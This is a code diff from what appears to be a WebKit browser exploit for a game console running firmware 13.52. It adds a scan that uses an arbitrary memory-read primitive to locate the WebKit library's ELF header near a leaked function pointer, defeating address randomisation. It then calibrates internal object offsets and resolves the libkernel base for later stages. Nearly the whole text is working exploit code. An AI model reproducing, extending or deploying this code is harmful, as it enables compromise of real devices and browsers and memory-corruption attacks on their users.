@@ -271,6 +271,53 @@ function nativeFnForOff(p, off) {
     return captureNativeFn(p, off.wk_JSFunction_m_function || 0x28);
 }
 
+const ELF_MAGIC = 0x464c457f;
+const MICRO_SCAN_STEP = 0x4000;
+const MICRO_SCAN_CAP = 200;
+
+function findExpm1DeltaSync(p, nativeFn, hint) {
+    const bands = [
+        [hint - 0x200000, hint + 0x200000],
+        [Math.max(0, hint - 0x800000), hint - 0x200000],
+        [hint + 0x200000, hint + 0x800000],
+    ];
+    let steps = 0;
+    for (let b = 0; b < bands.length && steps < MICRO_SCAN_CAP; b++) {
+        const start = Math.max(0, bands[b][0]);
+        const end = bands[b][1];
+        for (let delta = start; delta <= end && steps < MICRO_SCAN_CAP; delta += MICRO_SCAN_STEP) {
+            steps++;
+            const base = nativeFn.sub32(delta);
+            if (!alignedWebkitBase(base)) continue;
+            if (read4p(p, base) === ELF_MAGIC)
+                return { delta, base, steps, band: b };
+        }
+    }
+    return null;
+}
+
+function finishCalibrate(p, tableOff, mFunctionOff, nativeFn, delta, base, via) {
+    mark("CAL-OK", via + " base=" + base + " expm1=0x" + delta.toString(16));
+
+    const err = tryTableErrorImportDirect(p, base, tableOff);
+    if (err)
+        mark("CAL-ERROR", "table import OK lk=" + err.libkernelBase);
+    else
+        mark("CAL-WARN", "libkernel import miss — AB test may still pass");
+
+    const live = Object.assign({
+        fw_status: "calibrated on 13.52 hardware",
+        wk_JSFunction_m_function: mFunctionOff,
+        wk_expm1_builtin: delta,
+        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
+        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
+    }, err || {});
+
+    calibratedOff = live;
+    mark("PASTE-OFFSETS", JSON.stringify(live));
+    return live;
+}
+
 function calibrateLiteSync(p, tableOff) {
     const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
     const nativeFn = nativeFnForOff(p, mFunctionOff);
@@ -286,41 +333,42 @@ function calibrateLiteSync(p, tableOff) {
         return null;
     }
 
-    const base = nativeFn.sub32(hint);
-    const magic = read4p(p, base);
-    const aligned = alignedWebkitBase(base);
+    let delta = hint;
+    let base = nativeFn.sub32(hint);
+    let magic = read4p(p, base);
+    let via = "table-hint";
 
     mark("CAL-DIAG", "base=" + base + " magic=0x"
         + (magic == null ? "null" : magic.toString(16))
-        + " aligned=" + aligned);
+        + " aligned=" + alignedWebkitBase(base)
+        + " hint=0x" + hint.toString(16));
 
-    if (magic !== 0x464c457f) {
-        mark("CAL-FAIL", "ELF miss at hint=0x" + hint.toString(16));
-        return null;
-    }
-    if (!aligned) {
+    if (magic !== ELF_MAGIC) {
+        mark("CAL-MICROSCAN", "hint miss — sync ELF search (max " + MICRO_SCAN_CAP + " steps)");
+        logQuiet++;
+        let found = null;
+        try {
+            found = findExpm1DeltaSync(p, nativeFn, hint);
+        } finally {
+            logQuiet--;
+        }
+        if (!found) {
+            mark("CAL-FAIL", "ELF not found near hint — paste CAL-NATIVEFN line");
+            return null;
+        }
+        delta = found.delta;
+        base = found.base;
+        magic = ELF_MAGIC;
+        via = "micro-elf(steps=" + found.steps + ",band=" + found.band
+            + ",delta=0x" + delta.toString(16) + ")";
+        mark("CAL-DIAG", "found base=" + base + " magic=0x" + magic.toString(16)
+            + " delta=0x" + delta.toString(16)
+            + " (was hint=0x" + hint.toString(16) + ")");
+    } else if (!alignedWebkitBase(base)) {
         mark("CAL-WARN", "base not 0x4000-aligned but ELF ok");
     }
 
-    mark("CAL-OK", "table-hint base=" + base + " expm1=0x" + hint.toString(16));
-
-    const err = tryTableErrorImportDirect(p, base, tableOff);
-    if (err)
-        mark("CAL-ERROR", "table import OK lk=" + err.libkernelBase);
-    else
-        mark("CAL-WARN", "libkernel import miss — AB test may still pass");
-
-    const live = Object.assign({
-        fw_status: "calibrated inline",
-        wk_JSFunction_m_function: mFunctionOff,
-        wk_expm1_builtin: hint,
-        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
-        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
-    }, err || {});
-
-    calibratedOff = live;
-    mark("PASTE-OFFSETS", JSON.stringify(live));
-    return live;
+    return finishCalibrate(p, tableOff, mFunctionOff, nativeFn, delta, base, via);
 }
 
 function tryTableErrorImportDirect(p, webkitBase, tableOff) {
